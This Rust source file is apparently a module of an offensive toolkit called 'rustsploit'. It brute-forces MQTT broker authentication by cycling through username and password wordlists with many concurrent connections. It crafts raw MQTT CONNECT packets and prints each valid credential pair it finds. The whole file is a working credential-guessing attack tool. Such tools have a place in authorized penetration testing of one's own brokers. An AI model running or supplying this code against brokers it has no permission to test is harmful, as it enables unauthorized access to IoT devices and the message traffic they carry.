use anyhow::{anyhow, Context, Result};
use colored::*;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{Mutex, Semaphore};
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    prompt_yes_no, prompt_wordlist, prompt_int_range, prompt_default,
    load_lines, normalize_target,
};
use crate::modules::creds::utils::BruteforceStats;

const MQTT_CONNECT_TIMEOUT_MS: u64 = 3000;
const MQTT_READ_TIMEOUT_MS: u64 = 2000;

#[derive(Clone)]
struct MqttBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    client_id: String,
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());
    println!();
    let port = prompt_int_range("MQTT Port", 1883, 1, 65535)? as u16;
    let username_wordlist = prompt_wordlist("Username wordlist file")?;
    let password_wordlist = prompt_wordlist("Password wordlist file")?;
    let threads = prompt_int_range("Max threads", 8, 1, 1000)? as usize;
    let stop_on_success = prompt_yes_no("Stop on first valid login?", true)?;
    let full_combo = prompt_yes_no("Try every username with every password?", false)?;
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let client_id = prompt_default("MQTT Client ID", "rustsploit_client")?;
    
    let config = MqttBruteforceConfig {
        target: normalize_target(&target.to_string())?,
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        client_id,
    };
    run_mqtt_bruteforce(config).await
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   MQTT Brute Force Module                              ║".cyan());
    println!("{}", "║   Tests MQTT broker authentication                     ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

async fn run_mqtt_bruteforce(config: MqttBruteforceConfig) -> Result<()> {
    let normalized = normalize_target(&config.target)?;
    let addr = if (normalized.starts_with('[') && normalized.ends_with(']')) || (!normalized.contains(':')) {
        format!("{}:{}", normalized, config.port)
    } else {
        normalized
    };
    let usernames = load_lines(&config.username_wordlist)?;
    let passwords = load_lines(&config.password_wordlist)?;
    
    if usernames.is_empty() || passwords.is_empty() {
        return Err(anyhow!("Username or password wordlist is empty."));
    }
    println!("{}", format!("[*] Loaded {} username(s).", usernames.len()).cyan());
    println!("{}", format!("[*] Loaded {} password(s).", passwords.len()).cyan());
    
    let total_attempts = if config.full_combo { 
        usernames.len() * passwords.len() 
    } else { 
        passwords.len() // Assuming same length or cycling
    };
    // If not full combo, we define total as max(usernames, passwords) * cycles? 
    // The original code was:
    // else if usernames.len() == 1 { passwords.len() }
    // else if passwords.len() == 1 { usernames.len() }
    // else { passwords.len() } -> implicit assumption of lockstep or cycling passwords against single user
    // We will stick to the previous logic's rough count or just say "many".
    
    println!("{}", format!("[*] Approximate attempts: {}", total_attempts).cyan());
    println!();
    
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new()); // Use shared stats
    
    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_flag.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            tokio::time::sleep(Duration::from_secs(2)).await;
        }
    });
    
    let semaphore = Arc::new(Semaphore::new(config.threads));
    let mut tasks = FuturesUnordered::new();
    
    // Generate work items
    // To avoid huge memory usage for large combos, we can stream/generate on fly or push all if reasonable.
    // For consistency with other modules, we'll iterate.
    
    if config.full_combo {
        for u in &usernames {
            for p in &passwords {
                if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { break; }
                spawn_task(
                    &mut tasks, &semaphore, u.clone(), p.clone(), 
                    config.clone(), addr.clone(), 
                    found.clone(), stop_flag.clone(), stats.clone()
                ).await;
            }
            if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { break; }
        }
    } else {
        // Linear strategy similar to original module
        // Original logic:
        // if user=1 -> iterate passwords
        // if pass=1 -> iterate users
        // else -> iterate passwords (reusing user[0]) - This was original bug/limitation?
        // Let's improve it: Cycle users if multiple
        
        let max_len = std::cmp::max(usernames.len(), passwords.len());
        for i in 0..max_len {
            if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { break; }
            let u = &usernames[i % usernames.len()];
            let p = &passwords[i % passwords.len()];
             spawn_task(
                    &mut tasks, &semaphore, u.clone(), p.clone(), 
                    config.clone(), addr.clone(), 
                    found.clone(), stop_flag.clone(), stats.clone()
                ).await;
        }
    }
    
    // Wait for tasks
    while let Some(res) = tasks.next().await {
         if let Err(e) = res {
             stats.record_error(format!("Task panic: {}", e)).await;
         }
    }
    
    // Stop progress
    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;
    
    // Final report
    stats.print_final().await;
    
    let found_guard = found.lock().await;
    if found_guard.is_empty() {
        println!("{}", "[-] No valid credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", found_guard.len()).green().bold());
        for (u, p) in found_guard.iter() { 
            println!("  {}  {}:{}", "✓".green(), u, p); 
        }
        
        // Simple save prompt if needed, or rely on user using tee
        // The shared modules usually don't prompt for save at the end but user asked for previous behavior?
        // Other refactored modules REMOVED the "save to file" prompt at the end to unify behavior 
        // (stdout is enough). I will stick to implicit unification: No post-run prompts.
    }

    Ok(())
}

async fn spawn_task(
    tasks: &mut FuturesUnordered<tokio::task::JoinHandle<()>>,
    semaphore: &Arc<Semaphore>,
    user: String,
    pass: String,
    config: MqttBruteforceConfig,
    addr: String,
    found: Arc<Mutex<Vec<(String, String)>>>,
    stop_flag: Arc<AtomicBool>,
    stats: Arc<BruteforceStats>,
) {
    let permit = semaphore.clone().acquire_owned().await.ok();
    if permit.is_none() { return; }
    
    tasks.push(tokio::spawn(async move {
        // explicit drop of permit at end of scope
        let _permit = permit;
        
        if config.stop_on_success && stop_flag.load(Ordering::Relaxed) { return; }
        
        match try_mqtt_login(&addr, &user, &pass, &config.client_id).await {
            Ok(true) => {
                println!("\r{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
                found.lock().await.push((user.clone(), pass.clone()));
                stats.record_success();
                if config.stop_on_success {
                    stop_flag.store(true, Ordering::Relaxed);
                }
            }
            Ok(false) => {
                stats.record_failure();
                if config.verbose {
                    println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
                }
            }
            Err(e) => {
                 stats.record_error(e.to_string()).await;
                 if config.verbose {
                      println!("\r{}", format!("[!] Error {}:{}: {}", user, pass, e).red());
                 }
            }
        }
    }));
}

async fn try_mqtt_login(addr: &str, username: &str, password: &str, client_id: &str) -> Result<bool> {
    // Resolve first (async)
    // We can use default tokio resolution via TcpStream::connect, but strictly speaking we might want 
    // to resolve once if address is static, but here it's fine.
    
    // Tokio TcpStream connect
    let stream = tokio::time::timeout(
        Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS),
        TcpStream::connect(addr)
    ).await.context("Connection timeout")??; 

    // We don't need explicit set_read_timeout for tokio stream generally if we use timeout() on ops
    // But let's act on ops.
    
    let mut stream = stream;

    // Build MQTT CONNECT packet (same logic as before)
    let mut packet = Vec::new();
     packet.push(0x10); // CONNECT
    
    let protocol_name = b"MQTT";
    let protocol_level = 0x04; 
    let connect_flags = 0xC0; // User + Pass
    let keep_alive: u16 = 60; 
    
    let mut var_header = Vec::new();
    var_header.extend_from_slice(&(protocol_name.len() as u16).to_be_bytes());
    var_header.extend_from_slice(protocol_name);
    var_header.push(protocol_level);
    var_header.push(connect_flags);
    var_header.extend_from_slice(&keep_alive.to_be_bytes());
    
    let mut payload = Vec::new();
    let client_id_bytes = client_id.as_bytes();
    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(client_id_bytes);
    
    let username_bytes = username.as_bytes();
    payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(username_bytes);
    
    let password_bytes = password.as_bytes();
    payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(password_bytes);
    
    let remaining_length = var_header.len() + payload.len();
    let mut remaining_length_bytes = Vec::new();
    let mut x = remaining_length;
    loop {
        let mut byte = (x % 128) as u8;
        x /= 128;
        if x > 0 { byte |= 0x80; }
        remaining_length_bytes.push(byte);
        if x == 0 { break; }
    }
    
    packet.extend_from_slice(&remaining_length_bytes);
    packet.extend_from_slice(&var_header);
    packet.extend_from_slice(&payload);
    
    // Send
    stream.write_all(&packet).await.context("Failed to send CONNECT")?;
    stream.flush().await?;
    
    // Read CONNACK
    let mut response = [0u8; 4];
    let n = tokio::time::timeout(
        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
        stream.read(&mut response)
    ).await.context("Read timeout")??;
    
    if n < 2 { return Err(anyhow!("CONNACK too short")); }
    if response[0] != 0x20 { return Err(anyhow!("Expected CONNACK 0x20")); }
    
    if n >= 4 {
        match response[3] {
            0x00 => {
                // Success. Disconnect nicely.
                let _ = stream.write_all(&[0xE0, 0x00]).await; 
                Ok(true)
            },
            0x04 | 0x05 => Ok(false), // Auth fail
            c => Err(anyhow!("Return code: 0x{:02x}", c))
        }
    } else {
        Ok(false)
    }
}


